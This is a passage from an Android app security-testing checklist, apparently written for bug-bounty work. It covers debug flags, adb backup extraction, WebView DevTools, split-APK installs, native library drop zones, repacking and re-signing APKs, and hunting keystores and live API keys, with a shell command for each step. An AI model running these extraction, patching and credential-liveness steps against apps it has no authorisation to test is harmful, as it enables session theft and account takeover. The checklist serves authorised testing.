| **Attacker** | AM-11 physical unlocked with USB debugging; AM-03 where a local app can drive the backup |
| **Applies to** | `targetSdk >= 31` for the backup gate; `debuggable` matters on all versions. `allowBackup` defaults to **true** below targetSdk 31 where no `dataExtractionRules` is supplied — flag the default, not just an explicit `true`. |
| **Maps to** | developer.android.com/about/versions/12/behavior-changes-12 ("`adb backup` excludes app data for apps targeting Android 12; opt-in by setting `android:debuggable="true"`... Must set to false before release"); ATT&CK T1409, T1533 |

- **Test:** For `targetSdk >= 31`, `adb backup` excludes app data **unless** `android:debuggable="true"`. A release build carrying `debuggable="true"` therefore hands you a full data extraction with no root, on top of the usual debuggability impact.
- **How:**
```bash
grep -oE 'android:(debuggable|allowBackup|fullBackupContent|dataExtractionRules)="[^"]*"' out/AndroidManifest.xml
adb backup -f out.ab -noapk com.target.app && ls -l out.ab
dd if=out.ab bs=1 skip=24 | zlib-flate -uncompress > out.tar && tar tf out.tar
grep -rniE 'token|session|bearer|password|refresh' apps/com.target.app/sp/ apps/com.target.app/db/
```
- **Proof:** `application-debuggable` in badging output plus a non-trivially-sized `.ab` whose unpacked tar contains `shared_prefs/*.xml` with a live session token. Grep the extracted tar for a token you just captured in the proxy — **matching bytes is the proof**.
- **Escalation:** -> D11 (what is stored) -> D13 (replay the token). Note the framing that does **not** pay: H1 #1225158 (Zivver), "ADB Backup is enabled within AndroidManifest", awarded **$0** — the manifest flag alone was the entire report.
- **Ruled out when:** `adb backup` produces a `.ab` of trivial size (header only) or fails outright, **and** `targetSdk >= 31` with `debuggable` absent, **and** `dataExtractionRules` excludes the sensitive paths. Verify empirically — `adb backup` support varies by OEM and OS version; do not assume from the manifest in either direction.

### D02-032 · `setWebContentsDebuggingEnabled(true)` shipped unconditionally

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the WebView session cookie/JWT read from DevTools replays successfully |
| **Attacker** | AM-11 physical unlocked with USB debugging; AM-03 for a local app on the same device that can reach the abstract socket |
| **Applies to** | All. This flag is **independent** of `android:debuggable` — an app can be non-debuggable and still expose DevTools. The call must be guarded by `ApplicationInfo.FLAG_DEBUGGABLE` to pass. |
| **Maps to** | MASTG-TEST-0227 (Debugging Enabled for WebViews), MASWE-0063, MASTG-KNOW-0028, MASTG-TECH-0142 |

- **Test:** If called unconditionally, a connected host attaches Chrome DevTools to **every** WebView in the app, reads the DOM and `localStorage`, and executes JS in the page's origin.
- **How:**
```bash
grep -rn 'setWebContentsDebuggingEnabled' out/sources/
grep -rn -B3 -A3 'setWebContentsDebuggingEnabled' out/sources/ | grep -n 'FLAG_DEBUGGABLE\|BuildConfig.DEBUG'
adb shell cat /proc/net/unix | grep -i webview_devtools_remote
# then open chrome://inspect/#devices on the host
```
- **Proof:** A `@webview_devtools_remote_<pid>` abstract socket for the target PID in `/proc/net/unix`, and the app's WebView appearing under `chrome://inspect/#devices`. Then read `document.cookie` / `localStorage` from the DevTools console and replay the value against the API.
- **Escalation:** -> D15 session replay; -> D10 (the DevTools console lets you call any `@JavascriptInterface` bridge method directly, turning a bridge audit into a live one).
- **Ruled out when:** The call site is absent, **or** it is guarded by `(getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0` / `BuildConfig.DEBUG` **and** `/proc/net/unix` shows no `webview_devtools_remote` socket for the app's PID on a release build. Grep-only negatives are insufficient — check the socket at runtime, because a bundled SDK can enable it (-> D02-034).

### D02-033 · `android:testOnly="true"` — you were handed the wrong binary

| | |
|---|---|
| **Severity ceiling** | Low (but it invalidates the engagement scope; raise it immediately) |
| **VRT** | — (scope control) |
| **Attacker** | n/a |
| **Applies to** | All |
| **Maps to** | developer.android.com/guide/topics/manifest/application-element |

- **Test:** `android:testOnly` marks the app installable only via `adb` and unpublishable to Play. Its presence in a build handed to you as "production" means you are not testing the shipping artefact — every finding you write is about a binary no user has.
- **How:**
```bash
aapt2 dump xmltree base.apk --file AndroidManifest.xml | grep -iE 'testOnly|allowClearUserData|debuggable'
```
- **Proof:** `android:testOnly(0x01010272)=(type 0x12)0xffffffff` in the xmltree dump.
- **Escalation:** Stop and request the real release artefact. Then re-run D02-001 and D02-002 on it. A `testOnly` build is also typically debuggable, which is why testers mistake it for a D02-029 finding.
- **Ruled out when:** `testOnly` is absent from the xmltree dump **and** the artefact's signer matches the store artefact (D02-006). `android:allowClearUserData` (default `true`) is documented as applying to system apps — do not report its presence on a normal app.

### D02-034 · `BuildConfig.DEBUG == true` inside a bundled AAR/JAR

| | |
|---|---|
| **Severity ceiling** | Medium — High when the debug branch disables TLS validation, enables a test backend, or logs credentials |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) when it exposes a staging backend; `mobile_security_misconfiguration.ssl_certificate_pinning.absent` (P5) when it only relaxes pinning |
| **Attacker** | AM-06 network attacker (if the branch relaxes TLS) / AM-03 (if it enables verbose credential logging) |
| **Applies to** | All. The app module can be a correct release build while a bundled AAR/JAR was compiled with `DEBUG true`. |
| **Maps to** | MobSF rule `android_aar_jar_debug_enabled` (severity high, cvss 5.4, masvs `resilience-2`), pattern `class BuildConfig` AND `DEBUG.*?true` |

- **Test:** Find every `BuildConfig` class in the decompiled tree — not just the app's — and then find what the flag actually gates.
- **How:**
```bash
jadx -d src base.apk
grep -rn --include='*.java' -E 'class BuildConfig' src/
grep -rn --include='*.java' -E 'DEBUG *= *true' src/
grep -rn --include='*.java' -E 'BuildConfig\.DEBUG' src/ | head -50
```
- **Proof:** A decompiled `BuildConfig` with `public static final boolean DEBUG = true` in a package that is **not** the app's own, plus a reachable branch guarded by it that changes security behaviour (e.g. `if (BuildConfig.DEBUG) trustAllCerts()`), plus the behaviour observed at runtime.
- **Escalation:** -> D14 (pinning or validation bypass baked into the shipped build — and note the SDK did this, the developer did not) -> D20 (credential logging) -> D18 (the SDK responsible).
- **Ruled out when:** Every `BuildConfig.DEBUG` in the tree is `false`, **or** the `true` ones gate only logging that you confirmed produces no sensitive output at runtime (`adb logcat` while driving the auth flow), **or** R8 has already stripped the guarded branch — verify with `dexdump`/jadx that the branch body survived, not just that the constant exists.

### D02-035 · Debug/QA components and hidden menus surviving into the release variant

| | |
|---|---|
| **Severity ceiling** | High when the feature bypasses authentication, entitlement or payment; Medium when it only discloses configuration |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) for an auth-bypass menu; `broken_access_control.exposed_sensitive_android_intent` (varies — rated on what it exposes) for the component itself |
| **Attacker** | AM-03 zero-permission local app |
| **Applies to** | All. `targetSdk < 31`: components with an `<intent-filter>` default to exported. `android:exported="false"` is explicitly **insufficient** protection for a debug component — documented guidance is that on a rooted device, or when debuggable is enabled, ADB can still reach it. |
| **Maps to** | developer.android.com risk article `test-debug` (MASVS-CODE: Code Quality); MASWE-0063 |

- **Test:** Hunt build-variant leakage: staging endpoints, auth-bypass toggles, payment-skip switches, "developer options" activities.
- **How:**
```bash
grep -niE 'debug|test|qa|staging|internal|dev|mock|sandbox|bypass' out/AndroidManifest.xml
grep -rn 'BuildConfig\.\(DEBUG\|FLAVOR\|BUILD_TYPE\)' out/sources/
grep -rniE '(skipAuth|bypassLogin|forceEntitled|isTestUser|mockPayment|debugMenu|enableStaging)' out/sources/
adb shell am start -n com.target.app/.DebugSettingsActivity
adb shell dumpsys activity activities | grep topResumedActivity
```
- **Proof:** The debug activity renders (screenshot with `topResumedActivity` confirming it is yours), or a `BuildConfig.DEBUG`-guarded branch is reachable because the release build still contains the staging base URL — prove it by pointing the app at that host through the proxy and getting a 200 from staging.
- **Escalation:** Auth-bypass menus chain directly into D15 (account takeover) and D23 (entitlement fraud). A staging host reached from a release build is a D15 shadow-API entry point with weaker controls.
- **Ruled out when:** `am start` against every candidate component returns `SecurityException: Permission Denial: ... not exported` from a non-root shell, **and** the staging base URL is absent from the release strings/assets, **and** each `BuildConfig.DEBUG` branch body was stripped by R8. Bundle this with `android:debuggable` (D02-029), `setWebContentsDebuggingEnabled` (D02-032) and native debug symbols (D16) into **one** "debug artefacts shipped to production" item rather than four Lows.

### D02-036 · Debug-only deep links and debug navigation routes in the release manifest

| | |
|---|---|
| **Severity ceiling** | Medium (High if the route exposes data or state rather than only crashing) |
| **VRT** | `application_level_denial_of_service_dos.app_crash.malformed_android_intents` (**P5**) for a crash-only route; `broken_access_control.exposed_sensitive_android_intent` (varies) when it exposes data |
| **Attacker** | AM-03 zero-permission local app (any installed app can fire the intent); AM-02 if the scheme is web-reachable |
| **Applies to** | All |
| **Maps to** | H1 #3829030 (Yelp Business, Low 3.3 — `yelp-biz:///debug_navigation` crashed the app *and* invalidated the session); H1 #3399016 (Nextcloud, None 0.0 — crash-only DoS scored zero) |

- **Test:** Debug routes left reachable from an exported filter. The severity hinges entirely on whether the session survives the crash — a pure crash scores near zero.
- **How:**
```bash
grep -rniE 'debug|staging|internal|qa[_-]|dev[_-]|test[_-]' out/AndroidManifest.xml | grep -iE 'scheme|host|path|name='
adb logcat -c && adb shell am start -a android.intent.action.VIEW -d "<scheme>:///<debugroute>" \
  && adb logcat -d | grep -iE 'FATAL|AndroidRuntime'
# then reopen the app and check whether you are still signed in
```
- **Proof:** `adb logcat` showing a fatal exception, and reopening the app presenting the login screen. Yelp's report evidenced the persistent-logout loop by re-running `am start` in a `while true` shell loop.
- **Escalation:** -> D09 (the deep-link surface itself) -> D13 if the crash drops session state.
- **Ruled out when:** No debug-named scheme/host/path appears in the merged manifest, **or** firing every candidate route produces no fatal exception **and** the session survives (check by making an authenticated API call from the app after the attempt). Always test the session effect — the difference between Low 3.3 and None 0.0 in the corpus is exactly that.

### D02-037 · Build residue shipped inside the package: mapping files, unstripped symbols, source maps

| | |
|---|---|
| **Severity ceiling** | Medium — High when a shipped source map or mapping file exposes the encryption routine you then reimplement |
| **VRT** | `sensitive_data_exposure.sensitive_data_hardcoded.file_paths` (P5) for paths alone; the real routing follows whatever the residue lets you recover |
| **Attacker** | AM-01 (anyone who downloads the app) |
| **Applies to** | All |
| **Maps to** | hackwithsingh sec-14-5 #6, sec-14-18 #10; MASTG-TECH-0007 (Exploring the App Package) |

- **Test:** Look inside the APK/AAB for shipped build residue that hands you the source model — ProGuard mapping, unstripped `.so` symbols, JS source maps, `BuildConfig` debug constants, `.properties` version markers.
- **How:**
```bash
unzip -l base.apk | grep -Ei 'mapping|\.map$|\.properties$|\.json$|source|BUNDLE-METADATA'
for so in $(find out/lib -name '*.so'); do file "$so"; nm -D "$so" 2>/dev/null | head -3; done
grep -rn 'BuildConfig' out/smali*/ | head
jadx -d jadx-out base.apk && grep -rn 'DEBUG = true\|STAGING\|API_KEY' jadx-out/sources | head
```
- **Proof:** `file` reporting "not stripped" on a shipped `.so`, a `.map` file in `assets/`, or a `mapping.txt` inside the package.
- **Escalation:** Symbols -> D16 native analysis; a source map -> D19 (the un-minified JS bundle); a shipped mapping file also satisfies D02-007 for free.
- **Ruled out when:** No `.map`/`mapping.txt` in the archive, every `lib/*.so` reports "stripped", and `.properties` files carry no version or endpoint data. Note that `BUNDLE-METADATA/` inside an `.aab` is **not** packaged into APKs — finding a mapping there is expected and is not a finding against the shipped app.

### D02-038 · Base-only install: does the app fail closed without its required splits

| | |
|---|---|
| **Severity ceiling** | High when the missing split is the one performing attestation, licensing or integrity checking |
| **VRT** | `broken_access_control.privilege_escalation` (varies) when the removed module was the control; `broken_authentication_and_session_management.authentication_bypass` (P1) if the removed module performed the auth gate |
| **Attacker** | AM-03 (installs the base-only artefact) / AM-11 |
| **Applies to** | Apps shipped as AAB with dynamic feature modules or config splits (`android:isSplitRequired`) |
| **Maps to** | developer.android.com/guide/app-bundle/play-feature-delivery ("Apps must verify module installation before accessing code/resources via `SplitInstallManager.getInstalledModules()`") |

- **Test:** Bundled apps normally refuse to run without their required splits. Check whether the app degrades **open** rather than failing closed when a split is absent — you have then removed a control by omission, without touching the signature of `base.apk`.
- **How:**
```bash
grep -i 'isSplitRequired' out/AndroidManifest.xml
adb uninstall com.target.app
adb install base.apk                                  # base only, no splits
adb logcat -c; adb shell monkey -p com.target.app 1; adb logcat -d | grep -iE 'split|SplitCompat|missing'
# compare with the full set:
adb install-multiple -r base.apk split_config.*.apk
```
- **Proof:** The app launches base-only and a feature guarded by `SplitInstallManager.getInstalledModules()` is reachable anyway (the module check returns false but the code path proceeds), or the integrity/licensing module is simply absent and its checks never run. Screenshot both the base-only launch and the reached feature.
- **Escalation:** -> D21 (RASP/attestation removal with `base.apk`'s signature intact — a far cleaner story than patching smali) -> D23 if the removed module held licensing.
- **Ruled out when:** `adb install base.apk` fails with a missing-split error, **or** the app launches and immediately terminates with a documented missing-module message, **or** every module-gated code path is preceded by a `getInstalledModules()` check that actually blocks (prove by reaching the code path, not by reading the source). A crash on missing split is **correct** behaviour — do not file it as a DoS (`application_level_denial_of_service_dos.app_crash` is P5).

### D02-039 · `SplitInstallManager.getInstalledModules()` not checked before using module code

| | |
|---|---|
| **Severity ceiling** | Support (it is the mechanism behind D02-038) — Medium when it produces a reachable uninitialised state |
| **VRT** | — (mechanism; the finding is rated under D02-038) |
| **Attacker** | AM-03 |
| **Applies to** | Play Feature Delivery apps (on-demand, conditional and instant modules) |
| **Maps to** | developer.android.com/guide/app-bundle/play-feature-delivery |

- **Test:** Find every entry point into a dynamic feature module and check whether the installation state is verified first. Dynamic feature modules are also delivered *at runtime*, which makes them a dynamic-code-loading surface in their own right.
- **How:**
```bash
grep -rnE 'SplitInstallManager|SplitInstallRequest|getInstalledModules|SplitCompat\.install|SplitInstallHelper' out/sources/
grep -rn 'dist:module\|dist:onDemand\|dist:instant' out/AndroidManifest.xml out/base/manifest/* 2>/dev/null
```
  Then drive each entry point with the module absent (per D02-038) and observe.
- **Proof:** A call into module code with no preceding `getInstalledModules().contains(...)` guard, and the resulting behaviour on a base-only install.
- **Escalation:** -> D02-038 for the severity; -> D17 because the module itself is code delivered after install and its delivery channel is in scope.
- **Ruled out when:** Every module entry point is guarded, and the guard blocks (verified by reaching it on a base-only install), **or** the app has no dynamic feature modules — `grep 'dist:module'` empty and `isSplitRequired` absent.

### D02-040 · Code and native libraries that exist only in a config split

| | |
|---|---|
| **Severity ceiling** | High (the severity of whatever the split-only code leaks or exposes) |
| **VRT** | Follows the content — commonly `sensitive_data_exposure.disclosure_of_secrets.*` or `broken_access_control.exposed_sensitive_android_intent` (varies) |
| **Attacker** | Follows the content |
| **Applies to** | All AAB/XAPK/split-delivery apps; universally true for Flutter (`libapp.so`), React Native and Unity (`libil2cpp.so`) builds |
| **Maps to** | MASTG-TECH-0145 (Working with XAPK Files), MASTG-TECH-0003 |

- **Test:** `config.arm64_v8a` and `config.<lang>` splits sometimes carry different code paths, different strings, and the native libraries the base APK does not contain. Testing only `base.apk` produces false "not present" conclusions and a silently incomplete assessment.
- **How:**
```bash
for inner in splits/*.apk; do jadx -d "decompiled_$(basename "$inner" .apk)/" "$inner"; done
unzip -l splits/split_config.arm64_v8a.apk | grep -E 'libapp|libflutter|libil2cpp|libassemblies|\.so$'
for f in splits/*.apk; do echo "== $f"; aapt2 d xmltree "$f" --file AndroidManifest.xml \
  | grep -E 'E: (activity|service|receiver|provider|uses-permission)'; done
```
  Fast fallback when jadx is slow or fails on obfuscated DEX:
```bash
find splits -name 'classes*.dex' -exec strings -8 {} \; > strings_all.txt
```
- **Proof:** A component, permission, native library or hardcoded string present in a split and absent from `base.apk`, with its own exported/permission attributes quoted from the split's own manifest.
- **Escalation:** Split-only `.so` -> D16; split-only component -> D03/D04/D06/D07; split-only string -> D18.
- **Ruled out when:** Every split's manifest declares no components or permissions beyond the base's, every split's DEX (if any) contains only resource stubs, and `unzip -l` on each split shows no `.so`. Confirm you have the *complete* split set first (D02-004) — this item cannot be ruled out on an incomplete set.

### D02-041 · Re-signing and reinstalling a split set correctly

| | |
|---|---|
| **Severity ceiling** | Support (tooling) |
| **VRT** | — |
| **Attacker** | AM-12 |
| **Applies to** | All split/AAB-delivered apps |
| **Maps to** | MASTG-TOOL-0103 (uber-apk-signer); HN Security multi-APK `pm install-create` / `install-write` / `install-commit` flow |

- **Test:** A repack of `base.apk` alone will not install over a split-delivered app. Every split must be rebuilt and re-signed with the **same** key and installed in one session.
- **How:**
```bash
for f in splits/*.apk; do
  zipalign -P 16 -f 4 "$f" "aligned_$(basename "$f")"
  apksigner sign --ks key.jks --ks-pass pass:android "aligned_$(basename "$f")"
done
adb install-multiple -r aligned_base.apk aligned_split_config.*.apk
# session form, when install-multiple is unavailable:
adb shell pm install-create -r
adb shell pm install-write -S <size> <session> 0 /data/local/tmp/base.apk
adb shell pm install-commit <session>
```
- **Proof:** The reinstalled modified split set launches, and `adb shell dumpsys activity activities | grep topResumedActivity` shows the screen under test reached — a silently broken rebuild is indistinguishable from a fixed bug.
- **Escalation:** Enables D02-022 on bundled apps; mandatory before D02-038's comparison arm.
- **Ruled out when:** n/a — this is the procedure. If it fails, the cause is either mixed signing keys across splits or a `.locals` verifier crash (D02-023), not an app-side integrity control; distinguish before you claim one.

### D02-042 · `lib-*/` and extracted-native-library drop zones

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (varies) — realistically rated as arbitrary code execution in the app UID; `insecure_data_transport.executable_download.no_secure_integrity_check` (P4) if the library arrives over a channel |
| **Attacker** | AM-03 zero-permission local app with any file-write primitive into the app's data dir |
| **Applies to** | All. **targetSdk >= 29**: native code may not be executed from the app's internal data storage (ATT&CK M1006) — state which side of that gate the target is on. Android 14 (targetSdk 34) additionally requires dynamically-loaded files to be **read-only** before load. |
| **Maps to** | H1 #1377748 (Evernote, High), #1115864 (Mattermost, High 7.8), #1362313 (Evernote, sibling report); ATT&CK T1407; developer.android.com "Dynamic code loading" storage guidance |

- **Test:** `/data/data/<pkg>/lib-*/` is loaded at process start. Any primitive that writes an attacker-chosen filename into the app's data directory becomes persistent arbitrary code execution. Separately, some apps extract `.so`/`.dex`/`.apk` payloads out of `assets/` at runtime — each extraction step is an attacker-writable code path, and the **file mode** decides the severity.
- **How:**
```bash
unzip -l base.apk | grep -E 'assets/.*\.(so|apk|jar|dex|zip|bin)$'
grep -i 'extractNativeLibs' out/AndroidManifest.xml
adb shell run-as com.target.app ls -la /data/data/com.target.app/      # lib-1, lib-main, files, cache
adb shell 'ls -lRZ /data/data/com.target.app/ | grep -E "\.so|\.apk|\.jar|\.dex"'
frida-trace -U -n com.target.app -j 'java.util.zip.ZipInputStream!getNextEntry' -j 'java.io.FileOutputStream!$init'
# after triggering a write primitive, confirm the drop landed:
adb shell run-as com.target.app ls -la /data/data/com.target.app/lib-1/
```
- **Proof:** Your `.so`, built for the device's actual ABI, sitting in `lib-1/` (or `lib-main/`) under the name of a library the app loads (`libjnigraphics.so`, `libyoga.so`), plus a callback on next app launch — Evernote #1377748 proved it with `nc 127.0.0.1 6666` from an adb shell after restart. For the extraction variant, a `.so`/`.dex` written into `files/` or `code_cache/` whose mode from `ls -lZ` is anything other than `-r--------`.
- **Escalation:** -> D16 (the native surface you just entered) -> D17 (the loader) -> D07 (a FileProvider path traversal is the usual delivery of the write primitive) -> D11.
- **Ruled out when:** No file-write primitive reaches the app's data directory from a zero-permission app (test it, do not assume), **and** `targetSdk >= 29` blocks native execution from internal storage for the native variant, **and** every runtime-extracted file is written read-only before load. A writable drop zone with no reachable write primitive is a Support observation for D07, not a finding here.

### D02-043 · Merged-manifest diff: components and permissions no first-party code declared

| | |
|---|---|
| **Severity ceiling** | Medium standalone; High when a library-contributed provider is exported and leaks app data |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies — rated on what it exposes) |
| **Attacker** | AM-03 / AM-08 malicious third-party SDK |
| **Applies to** | All. `targetSdk < 17`: providers exported by default. `targetSdk < 31`: components with an `<intent-filter>` exported by default. |
| **Maps to** | MASTG-TECH-0141 (Inspecting the Merged AndroidManifest), MASTG-TOOL-0007 (Android Studio), MASTG-KNOW-0004 |

- **Test:** Third-party AARs contribute `<activity>`, `<provider>`, `<receiver>` and `<uses-permission>` entries into the merged manifest. They are part of the shipped attack surface and are routinely missed because they are not in `app/src/main/AndroidManifest.xml`.
- **How:** With source, Android Studio's **Merged Manifest** tab attributes each element to its contributing library. CLI:
```bash
./gradlew app:processReleaseManifest
cat app/build/intermediates/merged_manifests/release/AndroidManifest.xml
```
  Black-box, the shipped APK's manifest **is** the merged manifest — attribute each element by namespace:
```bash
apkanalyzer manifest print base.apk > merged.xml
grep -oE 'android:name="[^"]+"' merged.xml | sort -u | grep -viE '"com\.target\.'
aapt2 dump permissions base.apk
```
- **Proof:** A `<provider>` or `<receiver>` in the shipped manifest that maps to a library package (e.g. a `FileProvider` with a library authority), plus a `<uses-permission>` no first-party code uses. Name the contributing library.
- **Escalation:** -> D07 (library FileProviders with a `<root-path>`) -> D18 (SDK-declared components) -> D05 (library receivers) -> D20 (undisclosed collection under an SDK-added permission, which is also a Play data-safety mismatch).
- **Ruled out when:** Every component and permission in the merged manifest maps to a first-party namespace or an SDK you have accounted for and tested, and each SDK-contributed component is `exported="false"` with no `<intent-filter>` — verified by `am start` / `drozer` attempts from an unprivileged context, not by reading the attribute.

### D02-044 · Manifest-merger creep: an SDK re-opened cleartext or replaced the network security config

| | |
|---|---|
| **Severity ceiling** | High when the merged value is `usesCleartextTraffic="true"` or a permissive `networkSecurityConfig` that re-opens a network finding you would otherwise concede as mitigated; Medium for a permission over-grant |
| **VRT** | Routes to the network finding it re-enables; the permission over-grant alone is a Play data-safety mismatch, not a VRT-payable item |
| **Attacker** | AM-06 network attacker (cleartext), AM-08 (the SDK that did it) |
| **Applies to** | All Gradle-built apps. The merger report exists only with source access — the black-box fallback is below. `targetSdk < 28`: cleartext is allowed by default anyway, so the merged value only matters at 28+. |
| **Maps to** | Android manifest-merger report at `app/build/outputs/logs/manifest-merger-<variant>-report.txt` |

- **Test:** A dependency can add a dangerous permission, re-enable `usesCleartextTraffic`, or replace the `networkSecurityConfig` reference through ordinary merger rules — and neither the developer nor a source-only reviewer will see it. Nobody diffs the developer's source manifest against the merged manifest.
- **How:** With source:
```bash
cat app/src/main/AndroidManifest.xml
grep -nE 'ADDED from|MERGED from|IMPLIED|usesCleartextTraffic|uses-permission|provider|receiver|networkSecurityConfig' \
  app/build/outputs/logs/manifest-merger-release-report.txt
```
  Without source:
```bash
aapt2 dump permissions base.apk
grep -nE 'usesCleartextTraffic|networkSecurityConfig' out/AndroidManifest.xml
cat out/res/xml/network_security_config.xml 2>/dev/null
grep -rnE 'android:name="(com|io|net|org)\.' out/AndroidManifest.xml | grep -viE 'com\.target\.'
```
- **Proof:** A merger-report line reading `ADDED from [com.vendor:sdk:x.y.z] AndroidManifest.xml:NN` next to a dangerous permission or `android:usesCleartextTraffic="true"`, alongside the developer's own manifest that does not contain it. Black-box: the attribute present in the shipped manifest with no first-party justification, plus the SDK namespace that owns it.
- **Escalation:** -> D14 (cleartext re-enabled, or an `overridePins="true"` anchor you did not expect) -> D18 (the SDK) -> D20 (undisclosed data collection under the added permission).
- **Ruled out when:** The merger report shows no `ADDED from` line for any security-relevant attribute, **or** black-box, `usesCleartextTraffic` is absent/false, the NSC is first-party, and every permission maps to first-party code. Note that `overridePins="true"` outside a debug-only `<debug-overrides>` block is a finding in its own right (-> D14).

### D02-045 · Resource-level feature gating flipped and rebuilt

| | |
|---|---|
| **Severity ceiling** | High when the unlocked function performs a privileged **server-side** action; Low if the server independently rejects it |
| **VRT** | `broken_access_control.privilege_escalation` (varies) / `broken_authentication_and_session_management.authentication_bypass` (P1) if it exposes an admin registration flow that the server honours |
| **Attacker** | AM-03 (an attacker running a repacked client against their own account) / AM-05 another user of the same app |
| **Applies to** | All; depends on the absence of an integrity check (D02-022) and a decorative integrity signal (D02-021) |
| **Maps to** | sec-88 "Hacking InsecureBankv2 App" — Privilege Escalation section (`res/values/strings.xml`, `is_admin` = no -> yes) |

- **Test:** Search resources for booleans and strings that **gate functionality** rather than merely style it. If the server does not re-check the role, flipping the resource unlocks the feature.
- **How:**
```bash
apktool d -f -o out base.apk
grep -rniE '(is_admin|is_premium|isDebug|enable_[a-z_]+|feature_flag|show_[a-z_]+)' out/res/values/
# in jadx, locate getString(R.string.is_admin) / getBoolean(R.bool.*) in the gating Activity
sed -i '' 's|<string name="is_admin">no</string>|<string name="is_admin">yes</string>|' out/res/values/strings.xml
apktool b out -o patched.apk
zipalign -P 16 -f 4 patched.apk aligned.apk
apksigner sign --ks key.jks --ks-pass pass:android aligned.apk
adb install -r aligned.apk
```
- **Proof:** After reinstall, previously hidden functionality is present and usable — **and** the corresponding server action succeeds. Capture the authenticated request/response in the proxy. The UI appearing is not the finding; the 200 is.
- **Escalation:** -> D15 (does the backend enforce the role?) -> D23 (entitlements). Combine with a D13 Match-and-Replace on the entitlement response and then call the premium-only API directly — if that also works, the client-side gate was never a control.
- **Ruled out when:** The unlocked UI produces a server-side `403`/`401` on the privileged call, **with a body diff** proving the rejection is real and not a cosmetic status code, over at least two distinct privileged operations. A single 403 on one endpoint does not rule out the class.

### D02-046 · Signing and keystore material shipped inside the package

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (**P1**) when the key authenticates the app to a backend; `decentralized_application_misconfiguration.insecure_data_storage.plaintext_private_key` (P1) where applicable |
| **Attacker** | AM-01 remote, no interaction (anyone who downloads the APK) |
| **Applies to** | All |
| **Maps to** | Google ASI campaign "Embedded Keystore files" (started 2014-10-02 — common enough to warrant a dedicated pass); apkleaks detectors `RSA_Private_Key`, `SSH_DSA_Private_Key`, `SSH_EC_Private_Key`, `PGP_private_key_block`; MASTG-TOOL-0125 (apkleaks) |

- **Test:** Search the package for keystore and private-key blobs. A private key that authenticates the app to a backend (mTLS client cert, request-signing key) lets you impersonate the app and defeats any client-attestation scheme.
- **How:**
```bash
unzip -o -d x base.apk >/dev/null
find x -type f \( -name '*.jks' -o -name '*.keystore' -o -name '*.bks' -o -name '*.p12' -o -name '*.pfx' -o -name '*.pem' -o -name '*.key' \) -print
grep -ral -- '-----BEGIN \(RSA \|EC \|DSA \|\)PRIVATE KEY-----' x/
grep -ral 'PGP PRIVATE KEY BLOCK' x/
keytool -list -v -keystore x/res/raw/foo.bks -storetype BKS -storepass '' 2>&1 | head
openssl pkey -in x/assets/client.pem -noout -text | head
apkleaks -f base.apk
```
- **Proof:** `keytool -list` enumerating a `PrivateKeyEntry`, or `openssl` parsing the PEM — i.e. you hold the private half of a key the app uses for signing, mTLS or pinning. Then perform **one** authenticated request with it and stop: HackerOne Platform Standards state that hackers "should NOT test their validity beyond authenticating and then immediately deauthenticating".
- **Escalation:** -> D15 (impersonate the app to the API, defeating client attestation) -> D14 (forge a pinned chain if the bundled key is a CA) -> D12 (if it is a content-signing key, forge receipts and licence responses).
- **Ruled out when:** The only key material in the package is a **public** certificate or public key (pinning anchors, a `base64EncodedPublicKey` for licence verification) — confirmed by `openssl x509`/`openssl pkey -pubin` parsing it and `openssl pkey` failing. A password-protected keystore is **not** ruled out until you have tried the empty password, `android`, and any password string found in the package.

### D02-047 · Live credentials recoverable from the artefact — routing and the liveness proof

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (**P1**) vs `...for_internal_asset` (**P3**) vs `...pay_per_use_abuse` (**P4**, the correct path for a billable-but-not-sensitive Maps/Places key) vs `...intentionally_public_sample_or_invalid` (**P5**, what you get if you skip the liveness proof). Also `insecure_os_firmware.hardcoded_password.privileged_user` (**P1**) / `...non_privileged_user` (**P2**) for a static credential. |
| **Attacker** | AM-01 remote, no interaction |
| **Applies to** | All |
| **Maps to** | MASTG-TEST-0212 (hardcoded symmetric keys), MASWE-0004 (CWE-312, 321, 540, 798), MASVS-STORAGE-1, Mobile Top 10 2024 M1; MASTG-TOOL-0144 (gitleaks), MASTG-TOOL-0125 (apkleaks); HackerOne Platform Standards "Bounty Awards for Discovered Leaked Credentials" |

- **Test:** Extract every credential-looking string from the artefact, then **prove liveness** against the real service. A hardcoded string with no proven access is a P5. This is the single item in D02 that reliably reaches P1.
- **How:**
```bash
apktool d -f -o out base.apk
gitleaks detect --no-git --source out -v
apkleaks -f base.apk
grep -rEn '(AIza[0-9A-Za-z_\-]{35}|AKIA[0-9A-Z]{16}|sk_live_[0-9a-zA-Z]{24,}|-----BEGIN [A-Z ]*PRIVATE KEY-----|xox[baprs]-)' out/ ./base.apk 2>/dev/null
strings -n 12 out/lib/*/*.so out/assets/* out/res/raw/* 2>/dev/null \
  | grep -Ei 'secret|token|api[_-]?key|password|bearer' | sort -u
grep -rEn 'new SecretKeySpec\(|SecretKeySpec\(.*getBytes' out/sources/
grep -rEn 'https?://[a-z0-9.\-]+' out/res/values/strings.xml | sort -u
```
  Then exercise it, once: `aws sts get-caller-identity`; the relevant Google API endpoint for an `AIza` key; `auth.test` for a Slack token. **Stop immediately after proving identity — do not enumerate data.**
- **Proof:** The HTTP 200 (or the `GetCallerIdentity` ARN) returned by the third party using the extracted key, side by side with the file and line where it was found, and the artefact hash from D02-001. For a cross-tenant case, a request from your own laptop, authenticating only with the extracted credential, returning data belonging to another tenant.
- **Escalation:** -> D18 (a live cloud key is the entry point to the whole cloud surface) -> D12 (a hardcoded *crypto* key decrypts the app's local ciphertext) -> D11 (the plaintext token behind it) -> D15.
